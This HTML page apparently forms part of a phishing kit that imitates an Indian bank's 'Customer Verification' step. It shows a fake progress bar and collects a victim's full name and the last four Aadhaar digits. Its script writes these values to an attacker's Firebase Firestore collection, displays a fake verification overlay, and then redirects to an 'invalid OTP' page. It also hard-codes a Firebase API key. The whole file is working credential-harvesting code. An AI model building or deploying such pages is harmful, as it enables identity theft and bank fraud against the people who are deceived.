<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>sbynorewdpolnt</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    html, body {
      width: 100%;
      height: 100%;
      overflow-x: hidden;
      font-family: Arial, sans-serif;
      background-color: #eef2f5;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .header, .footer {
      width: 100%;
      max-width: 480px;
      background-color: #fff;
      text-align: center;
      position: relative;
    }
    .header img.main-header, .footer img {
      width: 100%;
      display: block;
    }
    .menu-button {
      position: absolute;
      top: 10px;
      left: 10px;
      width: 30px;
      height: 30px;
    }
    .headline {
      width: 100%;
      max-width: 400px;
      height: 70px;
      background: linear-gradient(to right, #8e24aa, #510f87);
      display: flex;
      align-items: center;
      padding-left: 10px;
      color: #fff;
      font-weight: bold;
      font-size: 18px;
      position: relative;
    }
    .headline .close-btn {
      position: absolute;
      right: 15px;
      font-size: 24px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
    }
    .headline .headline-text {
      margin-left: 30px;
    }

    /* Updated Progress Bar Style */
    .progress-bar-container {
      width: 100%;
      max-width: 480px;
      height: 12px;
      background-color: #e0e0e0;
      border-radius: 10px;
      margin: 15px 0;
      position: relative;
    }

    .progress-bar {
      height: 100%;
      background-color: #4caf50;
      border-radius: 10px;
      width: 95%;
      transition: width 0.5s ease-in-out;
      position: relative;
    }

    .progress-text {
      position: absolute;
      width: 100%;
      text-align: center;
      font-size: 12px;
      top: 50%;
      transform: translateY(-50%);
      color: #ffffff;
    }

    .otp-section {
      width: 100%;
      max-width: 480px;
      background: #fff;
      margin: 20px 0;
      padding: 25px 20px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    .otp-title {
      text-align: center;
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 30px;
      color: #333;
    }
    .input-group {
      position: relative;
      margin-bottom: 20px;
    }
    .input-group input {
      width: 100%;
      padding: 10px 5px;
      font-size: 16px;
      border: none;
      border-bottom: 2px solid #6a1b9a;
      background: transparent;
      outline: none;
    }
    .input-group label {
      position: absolute;
      top: 10px;
      left: 5px;
      font-size: 16px;
      color: #666;
      transition: 0.2s all;
      pointer-events: none;
    }
    .input-group input:focus~label,
    .input-group input:not(:placeholder-shown)~label {
      top: -10px;
      font-size: 12px;
      color: #6a1b9a;
    }
    .required-star {
      color: red;
    }
    .submit-btn {
      width: 100%;
      padding: 12px;
      background-color: #6a1b9a;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 30px;
    }
    .security-image img {
      width: 100%;
      max-width: 480px;
      border-radius: 8px;
      margin-top: 20px;
    }
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.9);
      backdrop-filter: blur(5px);
      z-index: 9999;
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding-top: 80px;
    }
    .spinner {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #6a1b9a;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    .loading-text {
      font-size: 18px;
      color: #333;
      text-align: center;
      padding: 0 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

<!-- Loading Overlay -->
<div class="overlay" id="overlay">
  <div class="spinner"></div>
  <div class="loading-text" id="loadingText">Please wait... Verifying Your Login Details... Redirecting in 3 seconds.</div>
</div>

<!-- Top Header -->
<div class="header">
  <img src="https://i.ibb.co/35CHJp2B/Menu.png" alt="Menu" class="menu-button">
  <img src="https://i.ibb.co/sdHPbk20/Header-1.jpg" alt="Top Header Logo" class="main-header">
</div>

<!-- Headline Section -->
<div class="headline">
  <div class="close-btn">X</div>
  <div class="headline-text">Customer Verification</div>
</div>

<!-- Updated Progress Bar -->
<div class="progress-bar-container">
  <div class="progress-bar" id="progressBar">
    <div class="progress-text" id="progressText">95% Complete</div>
  </div>
</div>

<!-- Aadhaar Verification Section -->
<div class="otp-section">
  <div class="otp-title">Aadhaar Verification</div>

  <div class="input-group">
    <input type="text" id="fullName" required placeholder=" " />
    <label for="fullName">Full Name (As per Aadhaar)<span class="required-star">*</span></label>
  </div>

  <div class="input-group">
    <input type="text" id="aadhaarLast4" required placeholder=" " maxlength="4" oninput="allowOnlyDigits(this)" />
    <label for="aadhaarLast4">Aadhaar Last 4 Digits<span class="required-star">*</span></label>
  </div>

  <button class="submit-btn" onclick="submitForm()">Submit</button>
</div>

<!-- Security Image -->
<div class="security-image">
  <img src="https://i.ibb.co/zVvCpZM2/Security-A.jpg" alt="Security Image">
</div>

<!-- Bottom Footer -->
<div class="footer">
  <img src="https://i.ibb.co/FbxkQBpm/Footer.jpg" alt="Footer Image">
</div>

<!-- Firebase Integration -->
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
    authDomain: "sbighsh.firebaseapp.com",
    projectId: "sbighsh",
    storageBucket: "sbighsh.appspot.com",
    messagingSenderId: "685947657107",
    appId: "1:685947657107:web:471a0557bb72235272a666"
  };

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  // Generate a session ID
  function generateSessionId() {
    return 'session_' + Math.random().toString(36).substr(2, 9);
  }

  // Store session ID
  let sessionId = generateSessionId();
  console.log("Session ID:", sessionId); // For debugging

  window.allowOnlyDigits = function(input) {
    input.value = input.value.replace(/\D/g, '').slice(0, 4);
  }

  window.submitForm = async function() {
    var fullName = document.getElementById('fullName').value.trim();
    var aadhaarLast4 = document.getElementById('aadhaarLast4').value.trim();

    if (fullName === "" || aadhaarLast4.length !== 4) {
      alert("Please fill all fields correctly.");
      return;
    }

    document.getElementById('overlay').style.display = 'flex';

    try {
      await addDoc(collection(db, "user-loginkk"), {
        fullName: fullName,
        aadhaarLast4: aadhaarLast4,
        sessionId: sessionId, // Save sessionId with the data
        timestamp: serverTimestamp()
      });

      let countdown = 3;
      const loadingText = document.getElementById('loadingText');
      const interval = setInterval(() => {
        loadingText.innerHTML = `Please wait... Verifying Your Login Details... Redirecting in ${countdown} seconds.`;
        countdown--;
        if (countdown < 0) {
          clearInterval(interval);
          window.location.href = 'invalidotp2.html';
        }
      }, 1000);
    } catch (error) {
      alert("Failed to save data.");
      console.error("Error:", error);
      document.getElementById('overlay').style.display = 'none';
    }
  }
</script>

</body>
</html>
